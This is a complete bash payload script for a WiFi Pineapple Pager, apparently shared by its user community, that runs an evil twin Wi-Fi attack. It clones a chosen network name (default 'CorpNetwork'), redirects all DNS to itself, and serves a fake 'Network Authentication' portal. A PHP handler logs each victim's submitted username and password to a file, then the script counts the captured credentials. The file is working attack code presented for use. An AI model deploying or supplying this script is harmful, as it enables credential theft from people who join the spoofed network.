#!/bin/bash
# Title: Evil Twin Manager
# Description: Setup and manage evil twin attacks with captive portal
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Interception
# Net Mode: NAT
#
# LED State Descriptions
# Magenta Solid - Configuring evil twin
# Amber Blink - Evil twin active
# Green Blink - Victim connected
# Red Blink - Error occurred

# Configuration
TARGET_SSID="CorpNetwork"
PORTAL_DIR="/tmp/evil_portal"
CREDS_FILE="/tmp/evil_creds.txt"
CHANNEL="6"

LOG "Starting Evil Twin Manager"
mkdir -p "$PORTAL_DIR"
touch "$CREDS_FILE"

# Get target SSID from user
target_ssid=$(TEXT_PICKER "Target SSID?" "$TARGET_SSID")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Operation cancelled"
        exit 1
        ;;
esac

# Get channel
channel=$(NUMBER_PICKER "Channel (1-11)?" "$CHANNEL" 1 11)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Operation cancelled"
        exit 1
        ;;
esac

LOG "Evil Twin: $target_ssid on channel $channel"

spinner_id=$(START_SPINNER "Creating evil twin...")

# Create captive portal HTML
cat > "$PORTAL_DIR/index.html" <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; }
        input { margin: 10px; padding: 10px; width: 250px; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; }
    </style>
</head>
<body>
    <h2>Network Authentication Required</h2>
    <p>Please enter your network credentials</p>
    <form method="post" action="/login">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF

# Create hostapd config
cat > /tmp/evil_hostapd.conf <<EOF
interface=wlan0
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF

# Start hostapd
hostapd /tmp/evil_hostapd.conf -B > /tmp/evil_hostapd.log 2>&1

# Configure interface
ifconfig wlan0 192.168.100.1 netmask 255.255.255.0

# Start dnsmasq for DHCP and DNS
cat > /tmp/dnsmasq.conf <<EOF
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.50,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
address=/#/192.168.100.1
EOF

dnsmasq -C /tmp/dnsmasq.conf

# Start lightweight HTTP server with PHP for portal
cd "$PORTAL_DIR"

# Create PHP handler for credentials
cat > "$PORTAL_DIR/login.php" <<'PHPEOF'
<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
if ($username && $password) {
    $file = fopen('/tmp/evil_creds.txt', 'a');
    fwrite($file, date('Y-m-d H:i:s') . " - User: $username, Pass: $password\n");
    fclose($file);
    header('Location: https://www.google.com');
}
?>
PHPEOF

# Start PHP server
php -S 192.168.100.1:80 -t "$PORTAL_DIR" > /dev/null 2>&1 &
php_pid=$!

STOP_SPINNER $spinner_id

LOG "Evil twin active: $target_ssid"
ALERT "Evil Twin Active"

# Monitor for 5 minutes
LOG "Monitoring for victims..."
spinner_id=$(START_SPINNER "Waiting for victims...")

for i in {1..60}; do
    sleep 5
    
    # Check for new credentials
    if [ -f "$CREDS_FILE" ] && [ -s "$CREDS_FILE" ]; then
        cred_count=$(wc -l < "$CREDS_FILE")
        LOG "Credentials captured: $cred_count"
    fi
done

STOP_SPINNER $spinner_id

# Cleanup
LOG "Stopping evil twin..."
kill $php_pid 2>/dev/null
killall hostapd dnsmasq 2>/dev/null

if [ -s "$CREDS_FILE" ]; then
    cred_count=$(wc -l < "$CREDS_FILE")
    LOG "Total credentials: $cred_count"
    ALERT "Captured $cred_count credentials"
else
    LOG "No credentials captured"
    ALERT "No victims"
fi

LOG "Evil twin manager finished"
